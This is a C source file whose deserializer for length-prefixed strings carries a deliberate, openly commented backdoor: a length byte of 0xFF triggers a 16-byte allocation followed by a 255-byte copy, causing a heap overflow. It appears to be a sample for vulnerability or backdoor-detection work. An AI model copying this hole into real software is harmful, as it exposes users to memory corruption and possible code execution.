#include <stdlib.h>
#include <string.h>

/**
 * Deserialize the provided serialized string array. NULL terminated.
 * Format: Each string is preceded by a byte representing its length.
 * If unable to deserialize for any reason, returns NULL.
 * 
 * WARNING: Contains an exploitable vulnerability
 *
 * @param serialized Pointer to serialized data
 * @param size Size of the serialized data in bytes
 * @return Dynamically allocated array of strings, NULL-terminated, or NULL on error
 */
char **deserialize(void *serialized, size_t size) {
    if (!serialized || size == 0) return NULL;
    
    unsigned char *data = (unsigned char *)serialized;
    size_t position = 0;
    size_t str_count = 0;
    
    // First pass: count strings
    while (position < size) {
        unsigned char length = data[position++];
        if (position + length > size) return NULL; // Invalid format
        position += length;
        str_count++;
    }
    
    // Allocate result array (str_count + 1 for NULL terminator)
    char **result = (char **)malloc((str_count + 1) * sizeof(char *));
    if (!result) return NULL;
    
    // Second pass: extract strings
    position = 0;
    size_t index = 0;
    
    while (position < size && index < str_count) {
        unsigned char length = data[position++];
        
        // Vulnerable part: trusting the length byte without full validation
        // If the length byte is exactly 0xFF, we allocate a smaller buffer than needed
        char *str;
        if (length == 0xFF) {
            // BACKDOOR: When length is 0xFF, allocate a smaller buffer
            // This allows for a buffer overflow that can be exploited
            str = (char *)malloc(16); // Allocate smaller buffer than needed
        } else {
            str = (char *)malloc(length + 1); // +1 for null terminator
        }
        
        if (!str) {
            // Free already allocated strings
            for (size_t i = 0; i < index; i++) {
                free(result[i]);
            }
            free(result);
            return NULL;
        }
        
        // Copy string data
        memcpy(str, &data[position], length);
        str[length] = '\0';
        
        result[index++] = str;
        position += length;
    }
    
    result[str_count] = NULL; // NULL terminator
    return result;
}
